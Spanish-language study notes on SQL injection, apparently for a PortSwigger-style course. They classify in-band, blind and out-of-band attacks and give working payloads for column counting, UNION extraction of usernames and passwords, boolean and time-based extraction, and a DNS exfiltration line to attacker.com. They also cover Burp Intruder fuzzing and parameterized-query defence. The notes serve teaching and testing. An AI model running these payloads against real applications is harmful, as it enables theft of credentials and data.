## ① Tipos de SQLi — Clasificación de Yuba

| Categoría | Tipos | Cómo recibes la info |
|---|---|---|
| **Inband (clásica)** | Error-based, Union-based | Los datos salen en la **misma respuesta HTTP** |
| **Blind (inferencial)** | Boolean-based, Time-based | No ves datos, solo **observas comportamiento** |
| **Out of Band** | DNS/HTTP exfil | Los datos salen por un **canal distinto** (colaborator) |

> [!important] Resumen en una frase
> - **Inband:** "Los veo en pantalla"
> - **Blind:** "Los deduzco por comportamiento"
> - **Out of Band:** "Los recibo por otro sitio"

## ② Inband — Error-based

### Qué es

Técnica que **fuerza a la base de datos a generar un error** que nos devuelva información útil.

### Cómo detectarla

```
 parameter='   → 500 Internal Server Error
 parameter=''  → 200 OK (comilla extra cierra)
 parameter="   → 500 Internal Error
 parameter=""  → 200 OK
```

### Qué buscar en el error

```
You have an error in your SQL syntax...
Check the manual that corresponds to your MySQL server version...
SELECT * FROM users WHERE id = '...'
```

> [!warning] Probar SIEMPRE comilla simple Y doble
> Si una no funciona, la otra puede funcionar. Depende de cómo esté escrita la query por detrás.

---

## ③ Inband — Union-based

### Las dos reglas de oro

| Regla | Descripción |
|---|---|
| **1. Mismo número de columnas** | El UNION debe tener el mismo número de columnas que la query original |
| **2. Tipos compatibles** | Las columnas deben ser del mismo tipo (string con string, num con num) |

### Metodología paso a paso

**Paso 1: Contar columnas**

```sql
' ORDER BY 1--    → OK
' ORDER BY 2--    → OK
' ORDER BY 3--    → OK
' ORDER BY 4--    → ERROR
```
Resultado: **3 columnas**

**O con NULL:**
```sql
' UNION SELECT NULL--           → ERROR
' UNION SELECT NULL,NULL--      → ERROR
' UNION SELECT NULL,NULL,NULL-- → OK
```

**Paso 2: Identificar tipo de dato**

```sql
' UNION SELECT 'a',NULL,NULL--
```

Si devuelve 200 → la columna 1 acepta texto
Si devuelve 500 → la columna 1 NO acepta texto

**Paso 3: Extraer datos**

```sql
' UNION SELECT username,password,NULL FROM users--
```

> [!tip] ORDER BY vs NULL
> - `ORDER BY`: Cuando peta, el número anterior es el correcto (ORDER BY 4 peta → 3 columnas)
> - `NULL`: Cuando peta, es el número que pusiste (UNION SELECT NULL,NULL,NULL,NULL peta → 3 era correcto)

## ④ Blind — Boolean-based

### Qué es

No vemos datos directamente. Hacemos **preguntas de sí o no** y observamos si la aplicación **cambia de comportamiento**.

### Cómo funciona

```
TrackingId=xyz' AND 1=1--  → Welcome back (TRUE)
TrackingId=xyz' AND 1=2--  → No aparece (FALSE)
```

### La consulta detrás

```sql
SELECT * FROM tracking WHERE tracking_id = 'xyz'
```

### El payload

```
' AND 1=1--    → TRUE: SELECT * FROM tracking WHERE tracking_id = 'xyz' AND 1=1
' AND 1=2--    → FALSE: SELECT * FROM tracking WHERE tracking_id = 'xyz' AND 1=2
```

> [!important] Las comillas importan
> Si la consulta es `WHERE id = 'valor'`, necesitas cerrar la comilla antes de inyectar. Si no, la consulta se rompe y no funciona.

### Para extraer datos con Boolean

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='administrator')='a'--
```

Si TRUE → la primera letra del usuario es 'a'
Si FALSE → probamos con 'b', 'c', etc.

**Esto es MUY lento** (carácter a carácter), pero funciona.

## ⑤ Blind — Time-based

### Qué es

Ni vemos contenido ni hay cambio visible. La única pista es **cuánto tarda el servidor en responder**.

### Cómo funciona

```sql
' AND SLEEP(5)--
```

Si la respuesta tarda **5 segundos** → el SQLi se ejecutó
Si responde inmediatamente → no se ejecutó

### Para extraer datos

```sql
' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
```

Si TRUE → tarda 5 segundos
Si FALSE → responde inmediatamente

## ⑥ Out of Band

### Qué es

Ni vemos contenido, ni hay cambios, ni hay tiempos. Los datos salen por un **canal externo** que nosotros controlamos.

### Cómo funciona

1. Levantamos un servidor (Burp Collaborator o nuestro propio servidor)
2. Inyectamos una consulta que haga una petición a nuestro servidor
3. Si recibimos la petición → el SQLi se ejecutó

### Ejemplo

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\file'))--
```

La BD hace una petición DNS a nuestro servidor con la versión de la BD.

## ⑦ Metodología de fuzzing con Burp Intruder

### Paso 1: Mapear la aplicación

1. Activar Foxy Proxy + Burp
2. Ir a Target → Scope → Añadir URL
3. **Hacer clic en TODOS los botones** de la web
4. En HTTP History → Ordenar por **parámetros**

### Paso 2: Identificar parámetros únicos

- Marcar en **naranja** los parámetros nuevos (primera vez que aparecen)
- Enviar al **Repeater** los parámetros únicos
- Ignorar parámetros repetidos (mismo nombre, diferente valor)

### Paso 3: Fuzzing con Intruder

1. En el Repeater, enviar la petición al Intruder (Ctrl+I)
2. En Intruder → Positions → **Clear** marcar el parámetro a testear
3. Cargar lista de payloads (SQLi, XSS, LFI, etc.)
4. **Start Attack**

### Paso 4: Analizar resultados

| Campo | Qué buscar |
|---|---|
| **Status code** | Un código diferente al resto (ej: 500 cuando todos dan 302) |
| **Length** | Una longitud de respuesta diferente |
| **Error** | Mensajes de error que no aparecen en otros payloads |
| **Timeout** | Respuestas que tardan más (time-based) |

> [!important] Una respuesta diferente = posible vulnerabilidad
> Si 999 payloads dan igual y 1 da diferente, **ahí hay oro**. Ir al Repeater y testear manualmente.

## ⑧ Defensas principales

### Consultas parametrizadas

```sql
-- VULNERABLE (concatenación directa)
query = "SELECT * FROM users WHERE id = " + user_input

-- SEGURO (parámetro preparado)
query = "SELECT * FROM users WHERE id = ?"
stmt.setString(1, user_input)
```

> [!important] La parametrización separa datos de código
> Por mucho que el usuario meta una comilla, la aplicación **siempre** la entenderá como texto, nunca como código SQL.

## ⑩ Notas de clase

- **Tres categorías de SQLi**: Inband, Blind, Out of Band
- **Inband** = los datos en la respuesta (Error + Union)
- **Blind** = los deduces por comportamiento (Boolean + Time)
- **Out of Band** = los recibes por otro canal (DNS/HTTP)
- **Siempre mapear la aplicación primero** (Scope → clicar todo → ordenar por parámetros)
- **Fuzzing con Intruder**: lanzar payloads y buscar respuestas diferentes
- **Las consultas parametrizadas** son la defensa principal
- **PortSwigger Academy** es el mejor recurso para practicar
- **The Web Application Hacker's Handbook** (cap. 21) tiene la metodología completa
- **Certificación PortSwigger**: 80€, 4 horas, 4 vulnerabilidades. Muy difícil.
